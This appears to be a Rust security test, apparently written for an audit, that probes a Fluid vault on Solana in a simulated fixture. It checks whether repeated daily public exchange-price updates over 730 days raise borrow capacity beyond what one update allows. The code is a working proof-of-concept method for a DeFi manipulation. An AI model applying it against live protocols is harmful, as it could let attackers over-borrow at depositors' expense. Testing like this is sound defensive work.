//! Fast 730d borrow-impact probe for public update_exchange_prices frequency manipulation.
//!
//! 365d produced real supply price divergence but did not move borrow capacity,
//! likely because the delta was below one vault tick (~0.15%). This uses 730d
//! to cross at least one tick boundary and performs the expensive repeated
//! schedule only once.

#[cfg(test)]
mod tests {
    use crate::vaults::fixture::{OperateVars, VaultFixture, DEFAULT_ORACLE_PRICE};
    use fluid_test_framework::StateManager;

    const VAULT_ID: u16 = 1;
    const POSITION_ID: u32 = 1;

    const SUPPLY_RATE_MAGNIFIER: i16 = 368;

    const ONE_DAY_SECONDS: i64 = 24 * 60 * 60;
    const DAYS: usize = 730;

    const COLLATERAL_AMOUNT: i128 = 1_000_000_000;

    const SEARCH_LOW: i128 = 100_000_000;
    const SEARCH_HIGH: i128 = 950_000_000;

    // Try offsets large enough to cross one tick after 730d.
    const CANDIDATE_OFFSETS: [i128; 8] = [
        1,
        100_000,
        250_000,
        500_000,
        1_000_000,
        1_500_000,
        2_000_000,
        3_000_000,
    ];

    fn setup_vault_fixture() -> VaultFixture {
        let mut fixture = VaultFixture::new().expect("Failed to create vault fixture");
        fixture.setup().expect("Failed to setup vault fixture");

        fixture
            .set_oracle_price(DEFAULT_ORACLE_PRICE, true)
            .expect("Failed to set oracle price");

        fixture
    }

    fn open_existing_position_before_schedule() -> (VaultFixture, solana_sdk::signature::Keypair) {
        let mut fixture = setup_vault_fixture();
        let alice = fixture.liquidity.alice.insecure_clone();

        fixture
            .update_supply_rate_magnifier(VAULT_ID, SUPPLY_RATE_MAGNIFIER)
            .expect("Failed to set supply rate magnifier");

        fixture
            .init_position(VAULT_ID, &alice)
            .expect("Failed to init position");

        fixture
            .operate_vault(&OperateVars {
                vault_id: VAULT_ID,
                position_id: POSITION_ID,
                user: &alice,
                position_owner: &alice,
                collateral_amount: COLLATERAL_AMOUNT,
                debt_amount: 0,
                recipient: &alice,
            })
            .expect("Failed to deposit baseline collateral");

        (fixture, alice)
    }

    fn apply_exchange_price_schedule(fixture: &mut VaultFixture, repeated: bool) {
        if repeated {
            for _ in 0..DAYS {
                fixture.liquidity.vm.warp_time(ONE_DAY_SECONDS);

                fixture
                    .update_exchange_prices_public(VAULT_ID)
                    .expect("Failed to public update exchange prices daily");
            }
        } else {
            fixture
                .liquidity
                .vm
                .warp_time(ONE_DAY_SECONDS * DAYS as i64);

            fixture
                .update_exchange_prices_public(VAULT_ID)
                .expect("Failed to public update exchange prices once");
        }

        fixture
            .set_oracle_price(DEFAULT_ORACLE_PRICE, true)
            .expect("Failed to refresh oracle price after warp");
    }

    fn try_existing_position_borrow_after_schedule(
        repeated: bool,
        debt_amount: i128,
        verbose: bool,
    ) -> (bool, u64, u64) {
        let (mut fixture, alice) = open_existing_position_before_schedule();

        let state_before = fixture
            .read_vault_state(VAULT_ID)
            .expect("Failed to read state before schedule");

        apply_exchange_price_schedule(&mut fixture, repeated);

        let state_after = fixture
            .read_vault_state(VAULT_ID)
            .expect("Failed to read state after schedule");

        let borrow_res = fixture.operate_vault(&OperateVars {
            vault_id: VAULT_ID,
            position_id: POSITION_ID,
            user: &alice,
            position_owner: &alice,
            collateral_amount: 0,
            debt_amount,
            recipient: &alice,
        });

        if verbose {
            println!("repeated={}", repeated);
            println!(
                "supply_exchange_price_before={}",
                state_before.supply_exchange_price
            );
            println!(
                "supply_exchange_price_after={}",
                state_after.supply_exchange_price
            );
            println!(
                "borrow_exchange_price_after={}",
                state_after.borrow_exchange_price
            );
            println!("candidate_debt={}", debt_amount);
            println!("borrow_result={:?}", borrow_res);
        }

        (
            borrow_res.is_ok(),
            state_after.supply_exchange_price,
            state_after.borrow_exchange_price,
        )
    }

    fn max_successful_one_shot_debt() -> i128 {
        let mut low = SEARCH_LOW;
        let mut high = SEARCH_HIGH;

        assert!(
            try_existing_position_borrow_after_schedule(false, low, false).0,
            "Search low debt failed"
        );

        assert!(
            !try_existing_position_borrow_after_schedule(false, high, false).0,
            "Search high debt unexpectedly succeeded; raise SEARCH_HIGH"
        );

        while low + 1 < high {
            let mid = low + ((high - low) / 2);

            if try_existing_position_borrow_after_schedule(false, mid, false).0 {
                low = mid;
            } else {
                high = mid;
            }
        }

        low
    }

    #[test]
    fn test_existing_position_730d_repeated_updates_extra_borrow() {
        let one_shot_max = max_successful_one_shot_debt();

        let (_, one_shot_supply_price, one_shot_borrow_price) =
            try_existing_position_borrow_after_schedule(false, one_shot_max, true);

        let one_shot_reject_candidate = one_shot_max + 1;
        let one_shot_rejects =
            !try_existing_position_borrow_after_schedule(false, one_shot_reject_candidate, true).0;

        assert!(
            one_shot_rejects,
            "one-shot max + 1 should fail in one-shot schedule"
        );

        // Build repeated fixture once; failed borrow attempts should rollback state.
        let (mut repeated_fixture, alice) = open_existing_position_before_schedule();

        apply_exchange_price_schedule(&mut repeated_fixture, true);

        let repeated_state = repeated_fixture
            .read_vault_state(VAULT_ID)
            .expect("Failed to read repeated state");

        println!("collateral_amount={}", COLLATERAL_AMOUNT);
        println!("one_shot_max_successful_debt={}", one_shot_max);
        println!("one_shot_supply_price={}", one_shot_supply_price);
        println!(
            "repeated_supply_price={}",
            repeated_state.supply_exchange_price
        );
        println!(
            "supply_price_delta={}",
            repeated_state.supply_exchange_price as i128 - one_shot_supply_price as i128
        );
        println!("one_shot_borrow_price={}", one_shot_borrow_price);
        println!(
            "repeated_borrow_price={}",
            repeated_state.borrow_exchange_price
        );
        println!(
            "borrow_price_delta={}",
            repeated_state.borrow_exchange_price as i128 - one_shot_borrow_price as i128
        );

        assert!(
            repeated_state.supply_exchange_price > one_shot_supply_price,
            "Expected repeated schedule to produce higher supply exchange price"
        );

        let mut found_candidate = false;

        for offset in CANDIDATE_OFFSETS {
            let candidate = one_shot_max + offset;

            let repeated_res = repeated_fixture.operate_vault(&OperateVars {
                vault_id: VAULT_ID,
                position_id: POSITION_ID,
                user: &alice,
                position_owner: &alice,
                collateral_amount: 0,
                debt_amount: candidate,
                recipient: &alice,
            });

            println!(
                "candidate_offset={} candidate={} repeated_result={:?}",
                offset, candidate, repeated_res
            );

            if repeated_res.is_ok() {
                println!("FOUND_IMPACT_CANDIDATE={}", candidate);
                found_candidate = true;
                break;
            }
        }

        assert!(
            found_candidate,
            "No candidate found where repeated updates allow debt above one-shot max"
        );
    }
}
